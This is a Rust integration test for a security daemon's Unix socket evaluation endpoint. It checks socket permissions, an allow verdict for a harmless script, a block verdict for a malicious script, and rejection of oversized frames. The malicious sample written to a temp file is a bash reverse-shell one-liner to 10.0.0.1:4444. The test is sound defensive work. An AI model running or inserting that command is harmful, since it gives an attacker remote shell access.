#[cfg(unix)]
mod unix_tests {
    use kernlock_daemon::engine::KernLockEngine;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::TempDir;
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};

    #[tokio::test]
    async fn test_unix_domain_socket_es_evaluation() {
        let tmp = TempDir::new().unwrap();
        let data_dir = tmp.path().join("data");
        std::fs::create_dir_all(&data_dir).unwrap();

        let engine = KernLockEngine::init(&data_dir).unwrap();

        // Configure engine into Protection mode to enable blocking
        let mut policy = engine.get_policy().unwrap();
        policy.mode = kernlock_core::SecurityMode::Protection;
        engine.update_policy(policy).unwrap();

        // Start socket server with data_dir fallback
        engine.start_unix_socket_server(&data_dir);

        let sock_path = data_dir.join("kernlock.sock");

        // Wait for socket to bind
        let mut found = false;
        for _ in 0..50 {
            if sock_path.exists() {
                found = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }

        let target_sock = if found {
            sock_path
        } else if std::path::Path::new("/var/run/kernlock/kernlock.sock").exists() {
            std::path::PathBuf::from("/var/run/kernlock/kernlock.sock")
        } else {
            panic!("Socket file was not created in data_dir or /var/run");
        };

        // Verify socket permissions 0600
        let metadata = std::fs::metadata(&target_sock).unwrap();
        let mode = metadata.permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "Socket permissions must be 0600");

        // Connect client
        let stream = tokio::net::UnixStream::connect(&target_sock).await.unwrap();
        let (reader, mut writer) = stream.into_split();
        let mut lines = BufReader::new(reader).lines();

        // 1. Test clean file -> verdict: allow
        let clean_path = tmp.path().join("clean.sh");
        std::fs::write(&clean_path, b"#!/bin/bash\necho hello\n").unwrap();

        let req1 = format!(
            "{{\"action\":\"eval_es\",\"path\":\"{}\",\"pid\":1234,\"ppid\":1,\"is_exec\":true}}\n",
            clean_path.display()
        );
        writer.write_all(req1.as_bytes()).await.unwrap();
        writer.flush().await.unwrap();

        let resp1 = lines.next_line().await.unwrap().unwrap();
        assert!(
            resp1.contains("\"verdict\":\"allow\""),
            "Expected allow for clean file, got: {}",
            resp1
        );

        // 2. Test malicious file -> verdict: block
        let mal_path = tmp.path().join("malicious.sh");
        std::fs::write(
            &mal_path,
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        )
        .unwrap();

        let req2 = format!(
            "{{\"action\":\"eval_es\",\"path\":\"{}\",\"pid\":9999,\"ppid\":1,\"is_exec\":true}}\n",
            mal_path.display()
        );
        writer.write_all(req2.as_bytes()).await.unwrap();
        writer.flush().await.unwrap();

        let resp2 = lines.next_line().await.unwrap().unwrap();
        assert!(
            resp2.contains("\"verdict\":\"block\""),
            "Expected block for malicious script, got: {}",
            resp2
        );
        assert!(
            resp2.contains("\"mode\":\"protection\""),
            "Expected mode: protection in response, got: {}",
            resp2
        );

        // 3. Test oversized frame rejected
        let huge_padding = "a".repeat(5000);
        let huge_req = format!("{{\"action\":\"eval_es\",\"path\":\"{}\"}}\n", huge_padding);
        writer.write_all(huge_req.as_bytes()).await.unwrap();
        writer.flush().await.unwrap();

        let resp3 = lines.next_line().await.unwrap().unwrap();
        assert!(
            resp3.contains("\"error\":\"frame_too_large\""),
            "Expected frame_too_large for >4KB message, got: {}",
            resp3
        );
    }
}
